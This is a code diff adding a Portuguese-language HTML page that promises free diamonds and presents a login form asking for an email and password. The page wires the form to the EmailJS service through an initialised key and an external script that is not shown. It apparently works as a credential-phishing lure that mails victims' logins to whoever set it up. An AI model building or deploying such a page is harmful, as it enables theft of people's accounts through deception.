@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>DImas gratis</title>
+     <link
+    href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css'
+    rel='stylesheet'> 
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>  
+    <main class="centro">
+    <form>
+
+    <h2>Enviar mensagem</h2>
+        <div class="item">
+            <input type="email" id="nome" placeholder="Digite seu email">
+            <i class="bx bxs-user"></i>
+        </div>
+        <div class="item">
+            <input type="password" id="mensagem" placeholder="Sua senha">
+            <i class="bx bxs-lock-alt"></i>
+        </div>
+        <button type="button" onclick="enviar()">Login</button>
+
+    
+    </form>
+    </main>
+
+
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <script>
+        (function () {
+            emailjs.init("ja4Jcoqd-FLYakbTk");
+        })();
+    </script>
+
+    <script src="scirt.js"></script>
+</body>
+</html>
